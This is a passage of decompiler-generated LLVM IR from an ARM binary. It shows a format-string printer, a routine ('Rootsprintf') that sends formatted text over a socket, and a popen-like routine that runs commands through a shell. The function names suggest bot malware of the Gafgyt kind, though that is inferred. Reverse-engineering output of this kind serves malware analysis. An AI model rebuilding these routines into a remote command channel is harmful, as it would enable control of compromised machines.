  br i1 %v7_8910, label %dec_label_pc_8918, label %dec_label_pc_8c64

dec_label_pc_8918:                                ; preds = %dec_label_pc_8908
  %v1_891c = add i32 %stack_var_-28.4.in34, 1
  %v5_8920 = inttoptr i32 %v1_891c to i8*
  %v2_8938 = load i8, i8* %v5_8920, align 1
  %v2_893c = icmp eq i8 %v2_8938, 0
  br i1 %v2_893c, label %dec_label_pc_8ca0, label %dec_label_pc_8944

dec_label_pc_8944:                                ; preds = %dec_label_pc_8918
  %v2_8948 = load i8, i8* %v5_8920, align 1
  %v7_894c = icmp eq i8 %v2_8948, 37
  br i1 %v7_894c, label %dec_label_pc_8c64, label %dec_label_pc_8954

dec_label_pc_8954:                                ; preds = %dec_label_pc_8944
  %v2_8958 = load i8, i8* %v5_8920, align 1
  %v7_895c = icmp eq i8 %v2_8958, 45
  br i1 %v7_895c, label %dec_label_pc_8964, label %dec_label_pc_8994.preheader

dec_label_pc_8964:                                ; preds = %dec_label_pc_8954
  %v1_8968 = add i32 %stack_var_-28.4.in34, 2
  %v5_896c = inttoptr i32 %v1_8968 to i8*
  br label %dec_label_pc_8994.preheader

dec_label_pc_8994.preheader:                      ; preds = %dec_label_pc_8964, %dec_label_pc_8954
  %stack_var_-28.0.ph = phi i8* [ %v5_8920, %dec_label_pc_8954 ], [ %v5_896c, %dec_label_pc_8964 ]
  %stack_var_-44.0.ph = phi i32 [ 0, %dec_label_pc_8954 ], [ 1, %dec_label_pc_8964 ]
  %v4_89942 = ptrtoint i8* %stack_var_-28.0.ph to i32
  %v2_89983 = load i8, i8* %stack_var_-28.0.ph, align 1
  %v7_899c7 = icmp eq i8 %v2_89983, 48
  br i1 %v7_899c7, label %dec_label_pc_897c, label %dec_label_pc_89e0.preheader

dec_label_pc_897c:                                ; preds = %dec_label_pc_8994.preheader, %dec_label_pc_897c
  %v4_89949 = phi i32 [ %v1_8980, %dec_label_pc_897c ], [ %v4_89942, %dec_label_pc_8994.preheader ]
  %stack_var_-44.08 = phi i32 [ %v1_898c, %dec_label_pc_897c ], [ %stack_var_-44.0.ph, %dec_label_pc_8994.preheader ]
  %v1_8980 = add i32 %v4_89949, 1
  %v5_8984 = inttoptr i32 %v1_8980 to i8*
  %v1_898c = or i32 %stack_var_-44.08, 2
  %v2_8998 = load i8, i8* %v5_8984, align 1
  %v7_899c = icmp eq i8 %v2_8998, 48
  br i1 %v7_899c, label %dec_label_pc_897c, label %dec_label_pc_89e0.preheader

dec_label_pc_89e0.preheader:                      ; preds = %dec_label_pc_897c, %dec_label_pc_8994.preheader
  %stack_var_-44.0.lcssa = phi i32 [ %stack_var_-44.0.ph, %dec_label_pc_8994.preheader ], [ %v1_898c, %dec_label_pc_897c ]
  %stack_var_-28.0.lcssa = phi i8* [ %stack_var_-28.0.ph, %dec_label_pc_8994.preheader ], [ %v5_8984, %dec_label_pc_897c ]
  %v4_89e011 = ptrtoint i8* %stack_var_-28.0.lcssa to i32
  %v2_89e412 = load i8, i8* %stack_var_-28.0.lcssa, align 1
  %tmp60 = icmp ult i8 %v2_89e412, 48
  br i1 %tmp60, label %dec_label_pc_8a00, label %dec_label_pc_89f0

dec_label_pc_89a8:                                ; preds = %dec_label_pc_89f0
  %v2_89b4 = mul i32 %stack_var_-48.019, 10
  %v2_89c0 = load i8, i8* %stack_var_-28.120, align 1
  %v3_89c0 = zext i8 %v2_89c0 to i32
  %v2_89c8 = add i32 %v2_89b4, -48
  %v1_89cc = add i32 %v2_89c8, %v3_89c0
  %v1_89d8 = add i32 %v4_89e021, 1
  %v5_89dc = inttoptr i32 %v1_89d8 to i8*
  %v2_89e4 = load i8, i8* %v5_89dc, align 1
  %tmp61 = icmp ult i8 %v2_89e4, 48
  br i1 %tmp61, label %dec_label_pc_8a00, label %dec_label_pc_89f0

dec_label_pc_89f0:                                ; preds = %dec_label_pc_89e0.preheader, %dec_label_pc_89a8
  %v4_89e021 = phi i32 [ %v1_89d8, %dec_label_pc_89a8 ], [ %v4_89e011, %dec_label_pc_89e0.preheader ]
  %stack_var_-28.120 = phi i8* [ %v5_89dc, %dec_label_pc_89a8 ], [ %stack_var_-28.0.lcssa, %dec_label_pc_89e0.preheader ]
  %stack_var_-48.019 = phi i32 [ %v1_89cc, %dec_label_pc_89a8 ], [ 0, %dec_label_pc_89e0.preheader ]
  %v2_89f4 = load i8, i8* %stack_var_-28.120, align 1
  %tmp62 = icmp ult i8 %v2_89f4, 58
  br i1 %tmp62, label %dec_label_pc_89a8, label %dec_label_pc_8a00

dec_label_pc_8a00:                                ; preds = %dec_label_pc_89a8, %dec_label_pc_89f0, %dec_label_pc_89e0.preheader
  %stack_var_-48.0.lcssa = phi i32 [ 0, %dec_label_pc_89e0.preheader ], [ %v1_89cc, %dec_label_pc_89a8 ], [ %stack_var_-48.019, %dec_label_pc_89f0 ]
  %stack_var_-28.1.lcssa = phi i8* [ %stack_var_-28.0.lcssa, %dec_label_pc_89e0.preheader ], [ %v5_89dc, %dec_label_pc_89a8 ], [ %stack_var_-28.120, %dec_label_pc_89f0 ]
  %v2_8a04 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8a08 = icmp eq i8 %v2_8a04, 115
  br i1 %v7_8a08, label %dec_label_pc_8a10, label %dec_label_pc_8a74

dec_label_pc_8a10:                                ; preds = %dec_label_pc_8a00
  %v1_8a14 = add i32 %stack_var_-32.133, 4
  %v1_8a20 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8a20 = load i32, i32* %v1_8a20, align 4
  %v2_8a2c = icmp eq i32 %v2_8a20, 0
  br i1 %v2_8a2c, label %dec_label_pc_8a40, label %dec_label_pc_8a34

dec_label_pc_8a34:                                ; preds = %dec_label_pc_8a10
  %v5_8a38 = inttoptr i32 %v2_8a20 to i8*
  br label %dec_label_pc_8a48

dec_label_pc_8a40:                                ; preds = %dec_label_pc_8a10
  br label %dec_label_pc_8a48

dec_label_pc_8a48:                                ; preds = %dec_label_pc_8a34, %dec_label_pc_8a40
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_19020.35, i32 0, i32 0), %dec_label_pc_8a40 ], [ %v5_8a38, %dec_label_pc_8a34 ]
  %v7_8a5c = call i32 @prints(i32 %tmp, i8* %storemerge, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 ptrtoint (i32* @0 to i32))
  %v2_8a68 = add i32 %v7_8a5c, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8a74:                                ; preds = %dec_label_pc_8a00
  %v2_8a78 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8a7c = icmp eq i8 %v2_8a78, 100
  br i1 %v7_8a7c, label %dec_label_pc_8a84, label %dec_label_pc_8ad8

dec_label_pc_8a84:                                ; preds = %dec_label_pc_8a74
  %v1_8a88 = add i32 %stack_var_-32.133, 4
  %v1_8a94 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8a94 = load i32, i32* %v1_8a94, align 4
  %v7_8ac0 = call i32 @printi(i32 %tmp, i32 %v2_8a94, i32 10, i32 1, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8acc = add i32 %v7_8ac0, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8ad8:                                ; preds = %dec_label_pc_8a74
  %v2_8adc = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8ae0 = icmp eq i8 %v2_8adc, 120
  br i1 %v7_8ae0, label %dec_label_pc_8ae8, label %dec_label_pc_8b3c

dec_label_pc_8ae8:                                ; preds = %dec_label_pc_8ad8
  %v1_8aec = add i32 %stack_var_-32.133, 4
  %v1_8af8 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8af8 = load i32, i32* %v1_8af8, align 4
  %v7_8b24 = call i32 @printi(i32 %tmp, i32 %v2_8af8, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8b30 = add i32 %v7_8b24, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8b3c:                                ; preds = %dec_label_pc_8ad8
  %v2_8b40 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8b44 = icmp eq i8 %v2_8b40, 88
  br i1 %v7_8b44, label %dec_label_pc_8b4c, label %dec_label_pc_8ba0

dec_label_pc_8b4c:                                ; preds = %dec_label_pc_8b3c
  %v1_8b50 = add i32 %stack_var_-32.133, 4
  %v1_8b5c = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8b5c = load i32, i32* %v1_8b5c, align 4
  %v7_8b88 = call i32 @printi(i32 %tmp, i32 %v2_8b5c, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 65)
  %v2_8b94 = add i32 %v7_8b88, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8ba0:                                ; preds = %dec_label_pc_8b3c
  %v2_8ba4 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8ba8 = icmp eq i8 %v2_8ba4, 117
  br i1 %v7_8ba8, label %dec_label_pc_8bb0, label %dec_label_pc_8c04

dec_label_pc_8bb0:                                ; preds = %dec_label_pc_8ba0
  %v1_8bb4 = add i32 %stack_var_-32.133, 4
  %v1_8bc0 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8bc0 = load i32, i32* %v1_8bc0, align 4
  %v7_8bec = call i32 @printi(i32 %tmp, i32 %v2_8bc0, i32 10, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8bf8 = add i32 %v7_8bec, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8c04:                                ; preds = %dec_label_pc_8ba0
  %v2_8c08 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8c0c = icmp eq i8 %v2_8c08, 99
  br i1 %v7_8c0c, label %dec_label_pc_8c14, label %dec_label_pc_8c84

dec_label_pc_8c14:                                ; preds = %dec_label_pc_8c04
  %v1_8c18 = add i32 %stack_var_-32.133, 4
  %v1_8c24 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8c24 = load i32, i32* %v1_8c24, align 4
  %v1_8c28 = urem i32 %v2_8c24, 256
  store i32 %v1_8c28, i32* %stack_var_-18, align 4
  %v6_8c4c = call i32 @prints(i32 %tmp, i8* %v5_8c4c, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 %v1_8c18)
  %v2_8c58 = add i32 %v6_8c4c, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8c64:                                ; preds = %dec_label_pc_8908, %dec_label_pc_8944
  %stack_var_-28.2 = phi i8* [ %v5_8920, %dec_label_pc_8944 ], [ %stack_var_-28.435, %dec_label_pc_8908 ]
  %v2_8c68 = load i8, i8* %stack_var_-28.2, align 1
  %v3_8c68 = zext i8 %v2_8c68 to i32
  %v3_8c74 = call i32 @printchar(i32* %arg1, i32 %v3_8c68)
  %v1_8c7c = add i32 %stack_var_-40.132, 1
  br label %dec_label_pc_8c84

dec_label_pc_8c84:                                ; preds = %dec_label_pc_8c04, %dec_label_pc_8ae8, %dec_label_pc_8a84, %dec_label_pc_8a48, %dec_label_pc_8c14, %dec_label_pc_8bb0, %dec_label_pc_8b4c, %dec_label_pc_8c64
  %stack_var_-40.0 = phi i32 [ %v1_8c7c, %dec_label_pc_8c64 ], [ %v2_8a68, %dec_label_pc_8a48 ], [ %v2_8acc, %dec_label_pc_8a84 ], [ %v2_8b30, %dec_label_pc_8ae8 ], [ %v2_8b94, %dec_label_pc_8b4c ], [ %v2_8bf8, %dec_label_pc_8bb0 ], [ %v2_8c58, %dec_label_pc_8c14 ], [ %stack_var_-40.132, %dec_label_pc_8c04 ]
  %stack_var_-32.0 = phi i32 [ %stack_var_-32.133, %dec_label_pc_8c64 ], [ %v1_8a14, %dec_label_pc_8a48 ], [ %v1_8a88, %dec_label_pc_8a84 ], [ %v1_8aec, %dec_label_pc_8ae8 ], [ %v1_8b50, %dec_label_pc_8b4c ], [ %v1_8bb4, %dec_label_pc_8bb0 ], [ %v1_8c18, %dec_label_pc_8c14 ], [ %stack_var_-32.133, %dec_label_pc_8c04 ]
  %stack_var_-28.3 = phi i8* [ %stack_var_-28.2, %dec_label_pc_8c64 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8a48 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8a84 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8ae8 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8b4c ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8bb0 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8c14 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8c04 ]
  %v4_8c84 = ptrtoint i8* %stack_var_-28.3 to i32
  %v1_8c88 = add i32 %v4_8c84, 1
  %stack_var_-28.4 = inttoptr i32 %v1_8c88 to i8*
  %v2_8c94 = load i8, i8* %stack_var_-28.4, align 1
  %v2_8c98 = icmp eq i8 %v2_8c94, 0
  br i1 %v2_8c98, label %dec_label_pc_8ca0, label %dec_label_pc_8908

dec_label_pc_8ca0:                                ; preds = %dec_label_pc_8918, %dec_label_pc_8c84, %entry
  %stack_var_-40.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-40.132, %dec_label_pc_8918 ], [ %stack_var_-40.0, %dec_label_pc_8c84 ]
  %v2_8ca4 = icmp eq i32* %arg1, null
  br i1 %v2_8ca4, label %dec_label_pc_8cbc, label %dec_label_pc_8cac

dec_label_pc_8cac:                                ; preds = %dec_label_pc_8ca0
  %v2_8cb0 = load i32, i32* %arg1, align 4
  %v3_8cb8 = inttoptr i32 %v2_8cb0 to i8*
  store i8 0, i8* %v3_8cb8, align 1
  br label %dec_label_pc_8cbc

dec_label_pc_8cbc:                                ; preds = %dec_label_pc_8ca0, %dec_label_pc_8cac
  ret i32 %stack_var_-40.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-28.4, { 1, 0 }
  uselistorder i8* %stack_var_-28.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8* %stack_var_-28.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-44.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8980, { 1, 0 }
  uselistorder i32 %stack_var_-44.0.ph, { 1, 0 }
  uselistorder i8* %v5_8920, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-40.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-32.133, { 13, 0, 11, 12, 9, 10, 7, 8, 5, 6, 3, 4, 1, 2 }
  uselistorder i32 %stack_var_-28.4.in34, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-18, { 1, 0 }
  uselistorder i32 (i32*, i32)* @printchar, { 4, 0, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 1, 0, 3, 2 }
  uselistorder i32 (i32, i8*, i32, i32, i32)* @prints, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8cbc, { 1, 0 }
  uselistorder label %dec_label_pc_8ca0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8c84, { 7, 4, 0, 5, 6, 1, 2, 3 }
  uselistorder label %dec_label_pc_8c64, { 1, 0 }
  uselistorder label %dec_label_pc_8a48, { 1, 0 }
  uselistorder label %dec_label_pc_8a00, { 1, 0, 2 }
  uselistorder label %dec_label_pc_89f0, { 1, 0 }
  uselistorder label %dec_label_pc_897c, { 1, 0 }
  uselistorder label %dec_label_pc_8908, { 1, 0 }
}

define i32 @zprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v6_8cd4 = load i32, i32* @r1, align 4
  store i32 %v6_8cd4, i32* %stack_var_-12, align 4
  %v3_8cd8 = load i32, i32* @fp, align 4
  store i32 36064, i32* %stack_var_-20, align 4
  %v2_8cdc = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8cdc, i32* @fp, align 4
  %v2_8ce4 = ptrtoint i32* %stack_var_-12 to i32
  %v4_8cfc = call i32 @print(i32* null, i32 %arg1, i32 %v2_8ce4)
  store i32 %v3_8cd8, i32* @fp, align 4
  ret i32 %v4_8cfc

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8d18 = load i32, i32* @fp, align 4
  store i32 36128, i32* %stack_var_-16, align 4
  %v2_8d1c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d1c, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_8d28 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8d40 = call i32 @print(i32* nonnull %stack_var_-36, i32 %arg2, i32 %v2_8d28)
  store i32 %v3_8d18, i32* @fp, align 4
  ret i32 %v4_8d40

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @Rootsprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_8d58 = load i32, i32* @r2, align 4
  store i32 %v6_8d58, i32* %stack_var_-8, align 4
  %v3_8d5c = load i32, i32* @fp, align 4
  store i32 36196, i32* %stack_var_-16, align 4
  %v2_8d60 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d60, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-48, align 4
  %v1_8d70 = call i32 @malloc(i32 2048)
  store i32 %v1_8d70, i32* %stack_var_-40, align 4
  store i32 2048, i32* @r2, align 4
  %v2_8d8c = inttoptr i32 %v1_8d70 to i8*
  %v3_8d8c = call i32 @__GI_memset(i8* %v2_8d8c, i32 0)
  %v2_8d98 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8db8 = call i32 @print(i32* nonnull %stack_var_-40, i32 %arg2, i32 %v2_8d98)
  %v3_8dc0 = call i32 @strlen(i8* %v2_8d8c)
  %v2_8dd0 = add i32 %v3_8dc0, %v1_8d70
  %v3_8dd8 = inttoptr i32 %v2_8dd0 to i8*
  store i8 10, i8* %v3_8dd8, align 1
  %v3_8de0 = call i32 @strlen(i8* %v2_8d8c)
  %v3_8de8 = load i32, i32* %stack_var_-48, align 4
  %v4_8df8 = inttoptr i32 %v1_8d70 to i32*
  %v5_8df8 = call i32 @__libc_send(i32 %v3_8de8, i32* %v4_8df8, i32 %v3_8de0, i32 16384)
  store i32 %v1_8d70, i32* @r0, align 4
  %v0_8e08 = call i32 @free()
  store i32 %v3_8d5c, i32* @fp, align 4
  ret i32 %v5_8df8

; uselistorder directives
  uselistorder i8* %v2_8d8c, { 1, 0, 2 }
  uselistorder i32 %v1_8d70, { 1, 2, 0, 3, 4 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8e20 = load i32, i32* @fp, align 4
  store i32 36392, i32* %stack_var_-4, align 4
  %v2_8e24 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8e24, i32* @fp, align 4
  %v2_8e38 = load i8, i8* %arg2, align 1
  %v7_8e3c = icmp eq i8 %v2_8e38, 114
  br i1 %v7_8e3c, label %dec_label_pc_8e54, label %dec_label_pc_8e44

dec_label_pc_8e44:                                ; preds = %entry
  %v2_8e48 = load i8, i8* %arg2, align 1
  %v7_8e4c = icmp eq i8 %v2_8e48, 119
  br i1 %v7_8e4c, label %dec_label_pc_8e54, label %dec_label_pc_8e68

dec_label_pc_8e54:                                ; preds = %dec_label_pc_8e44, %entry
  %v1_8e58 = add i32 %tmp, 1
  %v1_8e5c = inttoptr i32 %v1_8e58 to i8*
  %v2_8e5c = load i8, i8* %v1_8e5c, align 1
  %v2_8e60 = icmp eq i8 %v2_8e5c, 0
  br i1 %v2_8e60, label %dec_label_pc_8e74, label %dec_label_pc_8e68

dec_label_pc_8e68:                                ; preds = %dec_label_pc_8e44, %dec_label_pc_8e54
  br label %dec_label_pc_9084

dec_label_pc_8e74:                                ; preds = %dec_label_pc_8e54
  %v2_8e74 = ptrtoint i32* %stack_var_-32 to i32
  %v1_8e7c = call i32 @__GI_pipe(i32 %v2_8e74)
  %v1_8e84 = icmp slt i32 %v1_8e7c, 0
  br i1 %v1_8e84, label %dec_label_pc_8e8c, label %dec_label_pc_8e98

dec_label_pc_8e8c:                                ; preds = %dec_label_pc_8e74
  br label %dec_label_pc_9084

dec_label_pc_8e98:                                ; preds = %dec_label_pc_8e74
  %v2_8e9c = load i32, i32* @global_var_27b48.37, align 4
  %v2_8ea0 = icmp eq i32 %v2_8e9c, 0
  br i1 %v2_8ea0, label %dec_label_pc_8ea8, label %dec_label_pc_8f2c

dec_label_pc_8ea8:                                ; preds = %dec_label_pc_8e98
  %v0_8ea8 = call i32 @getdtablesize()
  %v5_8ebc = icmp sgt i32 %v0_8ea8, 0
  br i1 %v5_8ebc, label %dec_label_pc_8ecc, label %dec_label_pc_8ec0

dec_label_pc_8ec0:                                ; preds = %dec_label_pc_8ea8
  br label %dec_label_pc_9084

dec_label_pc_8ecc:                                ; preds = %dec_label_pc_8ea8
  %v3_8ed0 = mul i32 %v0_8ea8, 4
  %v1_8ed8 = call i32 @malloc(i32 %v3_8ed0)
  store i32 %v1_8ed8, i32* @global_var_27b48.37, align 4
  %v2_8ef4 = icmp eq i32 %v1_8ed8, 0
  br i1 %v2_8ef4, label %dec_label_pc_8efc, label %dec_label_pc_8f08

dec_label_pc_8efc:                                ; preds = %dec_label_pc_8ecc
  br label %dec_label_pc_9084

dec_label_pc_8f08:                                ; preds = %dec_label_pc_8ecc
  store i32 %v3_8ed0, i32* @r2, align 4
  %v2_8f28 = inttoptr i32 %v1_8ed8 to i8*
  %v3_8f28 = call i32 @__GI_memset(i8* %v2_8f28, i32 0)
  br label %dec_label_pc_8f2c

dec_label_pc_8f2c:                                ; preds = %dec_label_pc_8e98, %dec_label_pc_8f08
  %v0_8f2c = call i32 @__vfork()
  %v7_8f44 = icmp eq i32 %v0_8f2c, -1
  br i1 %v7_8f44, label %dec_label_pc_8f5c, label %dec_label_pc_8f4c

dec_label_pc_8f4c:                                ; preds = %dec_label_pc_8f2c
  %v2_8f50 = icmp eq i32 %v0_8f2c, 0
  %v2_8f84 = load i8, i8* %arg2, align 1
  %v7_8f88 = icmp eq i8 %v2_8f84, 114
  br i1 %v2_8f50, label %dec_label_pc_8f80, label %dec_label_pc_9020

dec_label_pc_8f5c:                                ; preds = %dec_label_pc_8f2c
  %v3_8f5c = load i32, i32* %stack_var_-32, align 4
  %v1_8f64 = call i32 @__libc_close(i32 %v3_8f5c)
  %v1_8f70 = call i32 @__libc_close(i32 %tmp4)
  br label %dec_label_pc_9084

dec_label_pc_8f80:                                ; preds = %dec_label_pc_8f4c
  br i1 %v7_8f88, label %dec_label_pc_8f90, label %dec_label_pc_8fc8

dec_label_pc_8f90:                                ; preds = %dec_label_pc_8f80
  %v7_8f94 = icmp eq i32 %tmp4, 1
  br i1 %v7_8f94, label %dec_label_pc_8fb8, label %dec_label_pc_8f9c

dec_label_pc_8f9c:                                ; preds = %dec_label_pc_8f90
  %v0_8fa8 = call i32 @dup2()
  %v1_8fb4 = call i32 @__libc_close(i32 %tmp4)
  br label %dec_label_pc_8fb8

dec_label_pc_8fb8:                                ; preds = %dec_label_pc_8f90, %dec_label_pc_8f9c
  %v3_8fb8 = load i32, i32* %stack_var_-32, align 4
  %v1_8fc0 = call i32 @__libc_close(i32 %v3_8fb8)
  br label %dec_label_pc_8ffc

dec_label_pc_8fc8:                                ; preds = %dec_label_pc_8f80
  %v3_8fc8 = load i32, i32* %stack_var_-32, align 4
  %v2_8fcc = icmp eq i32 %v3_8fc8, 0
  br i1 %v2_8fcc, label %dec_label_pc_8ff0, label %dec_label_pc_8fd4

dec_label_pc_8fd4:                                ; preds = %dec_label_pc_8fc8
  %v0_8fe0 = call i32 @dup2()
  %v3_8fe4 = load i32, i32* %stack_var_-32, align 4
  %v1_8fec = call i32 @__libc_close(i32 %v3_8fe4)
  br label %dec_label_pc_8ff0

dec_label_pc_8ff0:                                ; preds = %dec_label_pc_8fc8, %dec_label_pc_8fd4
  %v1_8ff8 = call i32 @__libc_close(i32 %tmp4)
  br label %dec_label_pc_8ffc

dec_label_pc_8ffc:                                ; preds = %dec_label_pc_8fb8, %dec_label_pc_8ff0
  store i32 ptrtoint ([8 x i8]* @global_var_19028.39 to i32), i32* @r0, align 4
  %v8_9014 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_19028.39 to i32), i32 ptrtoint ([3 x i8]* @global_var_19030.41 to i32), i32 ptrtoint ([3 x i8]* @global_var_19034.43 to i32), i32 %arg1, i32 0)
  %v1_901c = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_9020:                                ; preds = %dec_label_pc_8f4c
  br i1 %v7_8f88, label %dec_label_pc_9030, label %dec_label_pc_9048

dec_label_pc_9030:                                ; preds = %dec_label_pc_9020
  %v3_9030 = load i32, i32* %stack_var_-32, align 4
  %v1_9040 = call i32 @__libc_close(i32 %tmp4)
  br label %dec_label_pc_905c

dec_label_pc_9048:                                ; preds = %dec_label_pc_9020
  %v3_9050 = load i32, i32* %stack_var_-32, align 4
  %v1_9058 = call i32 @__libc_close(i32 %v3_9050)
  br label %dec_label_pc_905c

dec_label_pc_905c:                                ; preds = %dec_label_pc_9030, %dec_label_pc_9048
  %stack_var_-40.0 = phi i32 [ %v3_9030, %dec_label_pc_9030 ], [ %tmp4, %dec_label_pc_9048 ]
  %v3_9060 = mul i32 %stack_var_-40.0, 4
  %v2_906c = load i32, i32* @global_var_27b48.37, align 4
  %v2_9070 = add i32 %v2_906c, %v3_9060
  %v2_9078 = inttoptr i32 %v2_9070 to i32*
  store i32 %v0_8f2c, i32* %v2_9078, align 4
  br label %dec_label_pc_9084

dec_label_pc_9084:                                ; preds = %dec_label_pc_8f5c, %dec_label_pc_8efc, %dec_label_pc_8ec0, %dec_label_pc_8e8c, %dec_label_pc_8e68, %dec_label_pc_905c
  %stack_var_-44.0 = phi i32 [ -1, %dec_label_pc_8e8c ], [ -1, %dec_label_pc_8efc ], [ -1, %dec_label_pc_8f5c ], [ %stack_var_-40.0, %dec_label_pc_905c ], [ -1, %dec_label_pc_8ec0 ], [ -1, %dec_label_pc_8e68 ]
  store i32 %v3_8e20, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v0_8f2c, { 1, 2, 0 }
  uselistorder i32 %v3_8ed0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp4, { 0, 5, 4, 3, 2, 1 }
  uselistorder i8* %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9084, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_905c, { 1, 0 }
  uselistorder label %dec_label_pc_8ffc, { 1, 0 }
  uselistorder label %dec_label_pc_8ff0, { 1, 0 }
  uselistorder label %dec_label_pc_8fb8, { 1, 0 }
  uselistorder label %dec_label_pc_8f2c, { 1, 0 }
  uselistorder label %dec_label_pc_8e68, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_90a4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_90a4, i32* @ip, align 4
  %v2_90bc = load i32, i32* @global_var_27b48.37, align 4
  %v2_90c0 = icmp eq i32 %v2_90bc, 0
  br i1 %v2_90c0, label %dec_label_pc_9214, label %dec_label_pc_90c8

dec_label_pc_90c8:                                ; preds = %entry
  %v3_90cc = mul i32 %arg1, 4
  %v2_90dc = add i32 %v2_90bc, %v3_90cc
  %v1_90e0 = inttoptr i32 %v2_90dc to i32*
  %v2_90e0 = load i32, i32* %v1_90e0, align 4
  %v2_90e4 = icmp eq i32 %v2_90e0, 0
  br i1 %v2_90e4, label %dec_label_pc_9214, label %dec_label_pc_90f8

dec_label_pc_90f8:                                ; preds = %dec_label_pc_90c8
  %v1_90fc = call i32 @__libc_close(i32 %arg1)
  %v2_9100 = ptrtoint i32* %stack_var_-276 to i32
  store i32 %v2_9100, i32* @r0, align 4
  %v1_9108 = call i32 @sigemptyset(i32 %v2_9100)
